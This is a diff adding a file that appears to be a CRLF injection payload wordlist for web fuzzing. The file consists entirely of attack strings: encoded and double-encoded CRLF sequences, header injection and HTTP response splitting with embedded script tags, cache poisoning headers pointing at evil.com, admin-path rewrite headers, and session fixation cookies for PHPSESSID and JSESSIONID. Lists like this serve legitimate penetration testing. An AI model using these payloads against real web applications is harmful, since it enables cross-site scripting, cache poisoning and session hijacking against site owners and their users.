@@ -1,0 +1,56 @@
+# CRLF Injection Payloads
+# Standard CRLF sequences
+%0d%0a
+%0D%0A
+%0d%0aSet-Cookie:crlf=injection
+%0d%0aX-Injected:true
+%0D%0ASet-Cookie:crlf=injection
+%0D%0AX-Injected:header
+
+# Double encoding
+%250d%250a
+%250D%250A
+%25%30%64%25%30%61
+%25%30D%25%30A
+
+# Unicode variants
+%u000d%u000a
+%E5%98%8A%E5%98%8D
+
+# Raw bytes (for testing)
+\r\n
+\r\nSet-Cookie:test=crlf
+\r\nX-Injected:true
+
+# Header injection payloads
+%0d%0aContent-Length:0%0d%0a%0d%0a
+%0d%0aHTTP/1.1 200 OK%0d%0a
+%0d%0aLocation:http://evil.com
+%0d%0a%0d%0a<script>alert(1)</script>
+
+# Response splitting
+%0d%0aContent-Type:text/html%0d%0a%0d%0a<html>injected</html>
+%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert('XSS')</script>
+
+# Null byte combinations
+%00%0d%0a
+%0d%00%0a
+%0d%0a%00
+
+# Mixed encoding
+%0d%0a%20
+%20%0d%0a
+\n
+\r
+%0a
+%0d
+
+# Cache poisoning via headers
+%0d%0aX-Forwarded-Host:evil.com
+%0d%0aX-Original-URL:/admin
+%0d%0aX-Rewrite-URL:/admin
+
+# Session fixation
+%0d%0aSet-Cookie:session=attacker_session
+%0d%0aSet-Cookie:PHPSESSID=injected_session
+%0d%0aSet-Cookie:JSESSIONID=injected_session
